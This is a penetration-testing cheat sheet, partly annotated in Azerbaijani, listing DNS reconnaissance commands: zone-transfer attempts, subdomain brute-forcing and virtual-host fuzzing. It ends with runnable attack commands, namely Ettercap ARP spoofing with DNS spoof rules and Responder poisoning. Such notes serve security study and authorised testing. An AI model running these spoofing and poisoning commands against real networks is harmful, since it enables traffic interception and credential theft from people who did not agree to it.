# DNS Enumeration and Exploitation Technique

---

# Enumeration

## DNS Transfer Zone

```bash
nmap -sU -p 53 --script dns-zone-transfer --script-args dns-zonetransfer.domain=target.com 192.168.1.0/24
nmap -p 53 --script dns-recursion -sV target.com
nmap -p 53 --script dns-service-discovery target.com
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum" 192.168.0.1

# Bütün ad serverlərini tapmaq
host -t ns hədəf.com

# Dig ilə Zone Transfer cəhdi (hər bir NS üçün yoxlanılmalıdır)
dig @10.129.18.236 -x 10.129.18.236
dig axfr @ns1.hədəf.com hədəf.com
dig ANY hədəf.com +noall +answer

```

## Subdomain

```bash
--- Passive ---

# Config Special DNS Server
/etc/resolv.conf --> nameserver 10.10.10.10

# Subfinder (fastest, passive)
subfinder -d target.com -all -o subdomains.txt -t 100 -silent

# Amass (passive intel)
amass enum -passive -d target.com -o amass-passive.txt

# Dig (basic records)
dig target.com ANY +short
dig target.com AXFR @ns1.target.com  # Zone transfer attempt


--- Active ---

# Subbrute (fast DNS brute)
subbrute target.com /usr/share/wordlists/dnsmap.txt -t 50 -o subbrute.txt
python3 subbrute.py -p hədəf.com > resolved_subs.txt

# Fierce (classic brute)
fierce --domain target.com --subdomains /usr/share/wordlists/dnsmap.txt -o fierce.txt

# DNSrecon brute
dnsrecon -d inlanefreight.htb -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt -j results.json

ffuf -u http://target.com -H "Host: FUZZ.target.com" \
     -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 0 -t 100 -o vhost-http.json

-fs SIZE      # Filter by response size
-fw WORDS     # Filter by word count  
-fl LINES     # Filter by line count
-mc 200,301   # Match status codes only
-H "Host: X"  # Custom Host header
-k            # Ignore SSL errors
-t 100        # 100 threads
-o file.json  # JSON output
-rate 10      # Requests per second

```

# DNS Zone Transfer & VHOST Discovery

```bash
# Zone Transfer Attempts
dig @ns1.target.com target.com AXFR
dig @8.8.8.8 target.com AXFR  # Public NS test

# Multiple NS servers
for ns in $(dig ns target.com +short); do 
    dig @"$ns" target.com AXFR +short; 
done

# Virtual Host Discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w all-subdomains.txt -fs 0
gobuster vhost -u https://target.com -w all-subdomains.txt -t 50
ffuf -w /path/to/subdomains.txt -u http://<HƏDƏF_IP> -H "Host: FUZZ.hədəf.com" -fs 1234

```

# DNS Spoofing

```bash
# Terminal 1: Start Ettercap
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP/ /GATEWAY_IP/

# Terminal 2: DNS Spoof rules (/etc/ettercap/etter.dns)
evil.com A 192.168.1.100
*.target.com A 192.168.1.100

# Load DNS spoof plugin
ettercap -T -q -i eth0 -M arp:remote /TARGET_IP/ /GATEWAY_IP/ -P dns_spoof


# Full poisoning
responder -I eth0 -wrdvPfu

# Targeted DNS only
responder -I eth0 -rD
```
